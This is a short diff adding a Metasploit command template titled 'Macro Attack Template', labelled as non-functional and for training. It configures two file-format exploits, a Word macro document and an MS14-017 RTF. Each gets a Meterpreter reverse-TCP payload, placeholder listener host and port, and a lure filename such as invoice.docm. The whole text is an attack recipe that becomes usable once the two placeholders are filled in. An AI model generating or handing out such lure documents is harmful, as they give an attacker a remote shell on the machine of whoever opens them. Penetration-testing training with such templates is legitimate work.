@@ -1,0 +1,16 @@
+# Macro Attack Template
+# For Training Use – Non-functional Template
+
+use exploit/multi/fileformat/office_word_macro
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set FILENAME invoice.docm
+generate
+
+use exploit/windows/fileformat/ms14_017_rtf
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <LHOST>
+set LPORT <LPORT>
+set FILENAME document.rtf
+generate
